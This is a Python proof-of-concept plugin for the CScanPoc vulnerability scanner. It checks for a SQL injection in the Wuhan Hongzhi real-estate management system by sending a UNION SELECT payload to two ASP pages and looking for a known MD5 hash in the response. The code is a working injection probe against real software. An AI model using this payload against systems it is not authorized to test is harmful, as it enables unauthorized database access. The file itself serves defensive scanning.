# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Hongzhi_0001_p'  # 平台漏洞编号，留空
    name = '武汉弘智房产管理系统通用 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-14'  # 漏洞公布时间
    desc = '''
        武汉弘智科技房产管理系统是由武汉弘智科技打造的一款房产管理维护一体化系统。
        武汉弘智科技房产管理系统SQL注入漏洞。
        '/pubinfo/Moreysxk.asp?Qryxmmc=111',
        '/web/pubinfo/Moreysxk.asp?Qryxmmc=111'
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=079039'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '弘智房产管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'baf59615-3156-4d34-b420-2172def7e1f3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            anpayloads = [
                '/pubinfo/Moreysxk.asp?Qryxmmc=111',
                '/web/pubinfo/Moreysxk.asp?Qryxmmc=111'
            ]
            angetdata = '%25%27%20UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2Csys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%271234%27%29%29%2C6%2C7%2C8%2C9--%20%26Qryxkzh%3D1'
            for anpayload in anpayloads:
                url = self.target + anpayload + angetdata
                code, head, res, errcode, _ = hh.http(url)

                if code == 200 and '0x81dc9bdb52d04dc20036dbd8313ed055' in res:
                    #security_hole(arg + anpayload + '   :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
